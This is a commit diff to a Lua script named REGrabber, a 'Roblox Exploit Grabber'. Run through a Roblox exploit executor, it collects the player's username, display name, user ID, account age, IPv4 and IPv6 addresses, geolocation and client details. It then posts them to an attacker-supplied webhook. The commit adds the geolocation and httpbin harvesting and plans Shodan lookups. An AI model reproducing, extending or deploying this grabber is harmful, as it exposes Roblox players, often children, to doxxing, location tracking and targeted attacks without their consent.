88620ff00e67d28a0216b511831e9aa08264f088
Bang1338 <75790567+Bang1338@users.noreply.github.com>
2023-04-09 10:57:21 +0700

    Update regrabber.lua

--- regrabber.lua
+++ regrabber.lua
@@ -1,5 +1,5 @@
 --[[
-    REGrabber 0.1b
+    REGrabber 0.2b
     Roblox Exploit Grabber
     by bang1338
     
@@ -13,6 +13,10 @@
 local Webhook = "" -- Put your Webhook link here
 local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 (you can replace this with any API service)
 local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 (you can replace this with any API service)
+local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
+local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info
+-- TODO: Using Shodan API
+
 local Headers = {["content-type"] = "application/json"} -- DO NOT TOUCH
 
 local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer
@@ -21,10 +25,12 @@ local AccountAge = LocalPlayer.AccountAge -- Account age since created
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
 local UserId = LocalPlayer.UserId -- UserID
 local PlayerName = LocalPlayer.Name -- Player name
+local DisplayName= LocalPlayer.DisplayName
 local PlaceID = game.PlaceId -- The game that player is playing
 
+
 local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
-local rver = "Version 0.1b" -- Change to your version if you want
+local rver = "Version 0.2b" -- Change to your version if you want
 
 --[[ Identify the executor ]]--
 -- https://v3rmillion.net/showthread.php?tid=1163680&page=2
@@ -36,79 +42,95 @@ function identifyexploit()
 end
 
 --[[ Webhook ]]--
-local PlayerData =
-{
-       ["content"] = "",
-       ["embeds"] = {{
-           ["title"] = "REGrabber", -- Change it if you want
-           ["description"] = rver,  -- Version
-           ["fields"] = {
-               {
-                   --[[Username/PlayerName]]--
-                   ["name"] = "Username:",
-                   ["value"] = PlayerName,
-                   ["inline"] = true
-               },
-               {
-                   --[[Membership type]]--
-                   ["name"] = "Membership Type:",
-                   ["value"] = MembershipType,
-                   ["inline"] = true
-               },
-               {
-                   --[[Account age]]--
-                   ["name"] = "Account Age (days):",
-                   ["value"] = AccountAge,
-                   ["inline"] = true
-               },
-               {
-                   --[[UserID]]--
-                   ["name"] = "UserId:",
-                   ["value"] = UserId,
-                   ["inline"] = true
-               },
-               {
-                   --[[IPv4]]--
-                   ["name"] = "IPv4:",
-                   ["value"] = IPv4,
-                   ["inline"] = true
-               },
-               {
-                   --[[IPv6]]--
-                   ["name"] = "IPv6:",
-                   ["value"] = IPv6,
-                   ["inline"] = true
-               },
-               {
-                   --[[PlaceID]]--
-                   ["name"] = "Place ID: ",
-                   ["value"] = PlaceID,
-                   ["inline"] = true
-               },
-               {
-                   --[[Exploit/Executor]]--
-                   ["name"] = "Executor: ",
-                   ["value"] = identifyexploit(),
-                   ["inline"] = true
-               },
-               {
-                   --[[Log/Grab time]]--
-                   ["name"] = "Log Time:",
-                   ["value"] = LogTime,
-                   ["inline"] = true
-               },
-           },
-       }}
-   }
+local PlayerData = {
+        ["content"] = "",
+        ["embeds"] = {{
+           
+            ["author"] = {
+                ["name"] = "REGrabber "..rver, -- Grabber name and version
+            },
+           
+            ["title"] = PlayerName, -- Username/PlayerName
+            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
+            ["fields"] = {
+                {
+                    --[[Username/PlayerName]]--
+                    ["name"] = "Username:",
+                    ["value"] = PlayerName,
+                    ["inline"] = true
+                },
+                {
+                    --[[Membership type]]--
+                    ["name"] = "Membership Type:",
+                    ["value"] = MembershipType,
+                    ["inline"] = true
+                },
+                {
+                    --[[Account age]]--
+                    ["name"] = "Account Age (days):",
+                    ["value"] = AccountAge,
+                    ["inline"] = true
+                },
+                {
+                    --[[UserID]]--
+                    ["name"] = "UserId:",
+                    ["value"] = UserId,
+                    ["inline"] = true
+                },
+                {
+                    --[[IPv4]]--
+                    ["name"] = "IPv4:",
+                    ["value"] = IPv4,
+                    ["inline"] = true
+                },
+                {
+                    --[[IPv6]]--
+                    ["name"] = "IPv6:",
+                    ["value"] = IPv6,
+                    ["inline"] = true
+                },
+                {
+                    --[[PlaceID]]--
+                    ["name"] = "Place ID: ",
+                    ["value"] = PlaceID,
+                    ["inline"] = true
+                },
+                {
+                    --[[Exploit/Executor]]--
+                    ["name"] = "Executor: ",
+                    ["value"] = identifyexploit(),
+                    ["inline"] = true
+                },
+                {
+                    --[[Log/Grab time]]--
+                    ["name"] = "Log Time:",
+                    ["value"] = LogTime,
+                    ["inline"] = true
+                },
+                {
+                    --[[HTTPbin]]--
+                    ["name"] = "HTTPbin Data (JSON):",
+                    ["value"] = "```json"..'\n'..HTTPbin.."```",
+                    ["inline"] = false
+                },
+                {
+                    --[[geoPlugin]]--
+                    ["name"] = "geoPlugin Data (JSON):",
+                    ["value"] = "```json"..'\n'..GeoPlug.."```",
+                    ["inline"] = false
+                },
+            },
+        }}
+    }
 
 
 local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
 local HttpRequest = http_request;
 
 if syn then
-   HttpRequest = syn.request
-   else
-   HttpRequest = http_request
+    HttpRequest = syn.request
+    else
+    HttpRequest = http_request
 end
 
 -- Send to your webhook.
